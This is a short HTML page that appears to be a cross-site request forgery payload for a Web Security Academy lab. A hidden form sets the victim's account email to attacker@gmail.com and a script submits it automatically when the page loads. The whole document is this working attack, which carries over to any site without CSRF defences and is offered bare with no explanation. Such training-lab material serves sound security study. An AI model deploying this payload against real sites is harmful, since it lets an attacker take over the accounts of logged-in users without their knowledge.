<html>
    <body>
        <form action="https://0a2b00ac0324d7fb80b50d2a00580062.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@gmail.com">
   
        </form>
        <script>

            // إرسال النموذج
            document.forms[0].submit();
        </script>
    </body>
</html>
